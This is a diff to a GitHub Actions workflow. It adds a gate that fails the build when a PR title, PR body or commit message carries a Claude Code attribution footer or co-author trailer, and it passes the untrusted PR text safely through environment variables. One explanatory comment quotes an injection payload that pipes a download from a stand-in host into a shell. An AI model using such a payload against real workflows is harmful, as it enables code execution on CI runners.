@@ -11,6 +11,10 @@ on:
       - 'v[0-9]+.[0-9]+.[0-9]+'
   pull_request:
     branches: [main]
+    # `edited` is required by the AI-attribution gate below. The default types are
+    # opened/synchronize/reopened, none of which fire on a title or body edit, so
+    # without it a PR can go green and then have the footer pasted into the body.
+    types: [opened, synchronize, reopened, edited]
   workflow_dispatch:
     inputs:
       tag:
@@ -23,6 +27,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          # Full history so the AI-attribution gate can walk the PR commit range.
+          fetch-depth: 0
 
       - name: Setup Node.js
         uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
@@ -35,6 +42,66 @@ jobs:
 
       - name: Build
         run: npm run build
+
+      # AI-attribution gate for the two surfaces that are NOT files in the repo:
+      # the PR title/body and the commit messages. Tracked files (CHANGELOG.md,
+      # which ci.yml turns into the GitHub Release body, plus README/docs) are
+      # covered by the "ai-attribution" forbiddenPatterns rule in aahp.config.json,
+      # which already ran as part of `npm run build` above.
+      #
+      # This lives inside "Build and Test" on purpose: that job is a REQUIRED
+      # status check on main, so the gate blocks a merge today. A new top-level
+      # job would be advisory only until branch protection is updated to require it.
+      - name: No AI attribution in PR body or commit messages
+        if: github.event_name == 'pull_request'
+        env:
+          # The PR title and body are attacker-controlled: anyone who can open a PR
+          # from a fork controls them. They MUST reach the script as environment
+          # variables. Never write ${{ github.event.pull_request.body }} inside a
+          # run: block - Actions substitutes the raw text into the script BEFORE
+          # bash parses it, so a body containing '; curl evil | sh; #' would execute
+          # on the runner. Below they are only ever read as quoted "$VAR", which
+          # bash never re-parses as code.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          # POSIX-ERE twin of the aahp.config.json "ai-attribution" rule. grep -E
+          # has no (?:...) syntax, so the group is a plain (...). Anchored on the
+          # markdown link, the footer URL, or the trailer colon, so PROSE that
+          # merely describes the footer does not match. That is what keeps this
+          # gate from flagging its own definition.
+          PATTERN='\[Claude Code\]\(|claude\.(com/claude-code|ai/code)|Co-authored-by:[[:space:]]*Claude'
+          fail=0
+
+          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR title::Remove the tool/model attribution. The author of record is the human (CLAUDE.md hard rule)."
+            fail=1
+          fi
+
+          if printf '%s' "$PR_BODY" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR body::Remove the 'Generated with Claude Code' footer from the PR body. This repo is public and PR bodies are indexed."
+            fail=1
+          fi
+
+          # Fail closed: if the range cannot be read, do NOT silently pass. A bare
+          # `git log ... | grep` would swallow the git failure and report clean.
+          if ! MSGS=$(git log --format='%B' "$BASE_SHA..$HEAD_SHA"); then
+            echo "::error title=Cannot read PR commit range::git log $BASE_SHA..$HEAD_SHA failed. The checkout step needs fetch-depth: 0."
+            exit 1
+          fi
+
+          if printf '%s' "$MSGS" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in a commit message::A commit in this PR carries an attribution footer or a Co-Authored-By: Claude trailer. Rewrite it before merging - once merged the message is permanent."
+            git log --format='  %h %s' "$BASE_SHA..$HEAD_SHA" >&2
+            fail=1
+          fi
+
+          if [ "$fail" -ne 0 ]; then
+            exit 1
+          fi
+          echo "No AI attribution in PR title, body or commit messages."
 
       # AAHP conformance (v3.6+): the pinned @elvatis_com/aahp CLI self-checks handoff
       # set, MANIFEST schema, grounding, the exact-version dep pin, changelog format and
